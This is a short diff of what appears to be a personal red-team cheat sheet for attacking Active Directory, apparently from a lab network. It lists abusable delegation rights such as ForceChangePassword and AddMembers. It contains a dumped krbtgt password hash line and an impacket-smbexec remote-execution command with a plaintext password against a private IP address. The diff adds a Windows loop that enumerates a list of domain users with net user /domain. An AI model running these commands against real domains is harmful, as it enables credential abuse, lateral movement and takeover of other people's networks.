@@ -1,3 +1,5 @@
+
+
 #AD Exploit Permission Delegation
 + ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
 + AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
@@ -142,5 +144,9 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
 
 # Remote login with exec
 	impacket-smbexec corpmngr:"User4&*&*"@192.168.98.120
+
+# Loop Net User /DOM
+	for %u in (t2_alan.riley t2_caroline.dawson t2_henry.harvey t2_henry.shaw t2_irene.nash t2_jordan.hawkins t2_june.russell t2_kathleen.mills t2_lawrence.lewis t2_leon.francis t2_melanie.davies t2_robin.wyatt t2_ross.bird) do @echo ==== %u ==== && net user "%u" /domain && echo.
+
 
 # RedTeam-CheckSheet
